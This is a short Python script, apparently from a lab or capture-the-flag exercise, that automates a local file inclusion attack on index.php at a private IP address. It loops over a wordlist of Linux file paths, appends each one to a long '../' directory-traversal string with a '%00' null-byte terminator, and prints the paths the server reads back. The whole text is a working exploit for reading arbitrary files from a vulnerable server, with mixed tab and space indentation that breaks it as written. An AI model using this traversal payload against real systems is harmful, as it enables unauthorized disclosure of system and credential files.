import requests
nb = "%00"
file = open ("/root/scripts/lfi_linux.txt")
for line in file:
        dir = line.strip("\n")
        url = "http://192.168.154.133/index.php?page=../../../../../../../../../..%s%s" %(dir,nb)
        r = requests.get(url, verify=False)
	if "failed to open stream" not in r.text:
        #if len(r.text) != 0:
                print "################### "+ dir+" #######################"
